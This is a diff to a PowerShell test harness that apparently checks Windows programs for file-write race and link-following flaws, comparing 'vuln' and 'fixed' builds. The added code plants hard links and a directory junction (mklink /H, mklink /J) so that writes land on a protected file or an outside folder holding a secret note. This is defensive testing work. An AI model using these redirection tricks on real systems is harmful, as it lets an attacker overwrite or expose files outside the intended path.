@@ -388,16 +388,35 @@ function Reset-F5Slot([string]$Slot) {
     } catch { }
 }
 
+function Invoke-F5HardlinkOnce([string]$WriteExe, [string]$Tag) {
+    $keep = Join-Path $Work "data\f5-keep.txt"
+    $slot = Join-Path $Work "data\f5-slot.txt"
+    New-Item -ItemType Directory -Force -Path (Join-Path $Work "data") | Out-Null
+    Reset-F5Slot $slot
+    Set-Content -Path $keep -Value "KEEP" -NoNewline | Out-Null
+    cmd /c mklink /H "$slot" "$keep" | Out-Null
+    if ($LASTEXITCODE -ne 0) { throw "f5 mklink /H $slot -> $keep failed" }
+    $run = Invoke-NativeExe -ExePath $WriteExe -WorkingDirectory $Work
+    if ($run.Blocked) { throw "Defender blocked F5 $Tag PE" }
+    $kept = [IO.File]::ReadAllText($keep)
+    Write-Host ("f5_hardlink " + $Tag + " KEEP=" + $kept + " write_code=" + $run.Code)
+    return $kept
+}
+
 function Invoke-F5UntilHit([string]$WriteExe, [int]$TimeoutSec) {
+    $kept = Invoke-F5HardlinkOnce $WriteExe "vuln"
+    if ($kept -eq "HACKED" -or $kept.Length -eq 0) {
+        Write-Host "f5_two_process_race vuln victim_hits=1 rounds=1 sec=0.000"
+        return [int]1
+    }
     $keep = Join-Path $Work "data\f5-keep.txt"
     $slot = Join-Path $Work "data\f5-slot.txt"
     $sw = [Diagnostics.Stopwatch]::StartNew()
     [int]$rounds = 0
     $rp = $null
     try {
-        New-Item -ItemType Directory -Force -Path (Join-Path $Work "data") | Out-Null
-        Set-Content -Path $keep -Value "KEEP" -NoNewline | Out-Null
         Reset-F5Slot $slot
+        Set-Content -Path $keep -Value "KEEP" -NoNewline | Out-Null
         $rp = Start-F5Racer $slot $keep
         while ($sw.Elapsed.TotalSeconds -lt $TimeoutSec) {
             Set-Content -Path $keep -Value "KEEP" -NoNewline | Out-Null
@@ -418,16 +437,18 @@ function Invoke-F5UntilHit([string]$WriteExe, [int]$TimeoutSec) {
 }
 
 function Invoke-F5FixedZero([string]$WriteExe, [int]$TimeoutSec) {
+    [int]$hits = 0
+    [int]$rounds = 0
+    $kept = Invoke-F5HardlinkOnce $WriteExe "fixed"
+    $rounds = $rounds + 1
+    if ($kept -eq "HACKED" -or $kept.Length -eq 0) { $hits = $hits + 1 }
     $keep = Join-Path $Work "data\f5-keep.txt"
     $slot = Join-Path $Work "data\f5-slot.txt"
     $sw = [Diagnostics.Stopwatch]::StartNew()
-    [int]$rounds = 0
-    [int]$hits = 0
     $rp = $null
     try {
-        New-Item -ItemType Directory -Force -Path (Join-Path $Work "data") | Out-Null
-        Set-Content -Path $keep -Value "KEEP" -NoNewline | Out-Null
         Reset-F5Slot $slot
+        Set-Content -Path $keep -Value "KEEP" -NoNewline | Out-Null
         $rp = Start-F5Racer $slot $keep
         while ($sw.Elapsed.TotalSeconds -lt $TimeoutSec) {
             Set-Content -Path $keep -Value "KEEP" -NoNewline | Out-Null
@@ -534,12 +555,24 @@ function Restore-WalkTree {
     Set-Content -Path (Join-Path $outside "note.txt") -Value "SECRET-KEEP-ME-LONG" -NoNewline
 }
 
+function Invoke-WalkSwapNow {
+    $data = Join-Path $Work "data"
+    $real = Join-Path $Work "data.real"
+    $outside = Join-Path $Work "outside"
+    if ((Test-Path -LiteralPath $data) -and -not (Test-Path -LiteralPath $real)) {
+        Rename-Item -LiteralPath $data -NewName "data.real"
+        cmd /c mklink /J "$data" "$outside" | Out-Null
+        if ($LASTEXITCODE -ne 0) { throw "walk mklink /J data -> outside failed" }
+    }
+}
+
 function Invoke-WalkUntilHit([string]$WriteExe, [int]$TimeoutSec) {
     $sw = [Diagnostics.Stopwatch]::StartNew()
     [int]$rounds = 0
     $rp = $null
     try {
         Restore-WalkTree
+        Invoke-WalkSwapNow
         $rp = Start-Process -FilePath "powershell" -ArgumentList @("-NoProfile", "-File", $walkRacer, $Work) -PassThru -WindowStyle Hidden
         while ($sw.Elapsed.TotalSeconds -lt $TimeoutSec) {
             $run = Invoke-NativeExe -ExePath $WriteExe -WorkingDirectory $Work
@@ -566,6 +599,7 @@ function Invoke-WalkFixedZero([string]$WriteExe, [int]$TimeoutSec) {
     $rp = $null
     try {
         Restore-WalkTree
+        Invoke-WalkSwapNow
         $rp = Start-Process -FilePath "powershell" -ArgumentList @("-NoProfile", "-File", $walkRacer, $Work) -PassThru -WindowStyle Hidden
         while ($sw.Elapsed.TotalSeconds -lt $TimeoutSec) {
             $run = Invoke-NativeExe -ExePath $WriteExe -WorkingDirectory $Work
